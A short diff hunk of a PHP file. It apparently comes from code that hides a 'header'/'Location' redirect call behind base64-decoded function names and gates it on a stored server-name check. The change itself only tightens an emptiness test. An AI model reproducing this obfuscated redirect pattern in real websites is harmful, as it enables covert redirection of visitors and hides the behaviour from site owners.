@@ -13,7 +13,7 @@ $bFunction = 'base64_decode';
 $hFunction = $bFunction('aGVhZGVy');
 $lString = $bFunction('TG9jYXRpb24');
 
-$currentState = ($fileContent) ? explode($divider, $fileContent) : [null, null];
+$currentState = !empty($fileContent) ? explode($divider, $fileContent) : [null, null];
 $resp = $currentState[1];
 
 if ($currentState[0] !== $serverName || (!empty($resp) && $resp !== 'true')) {
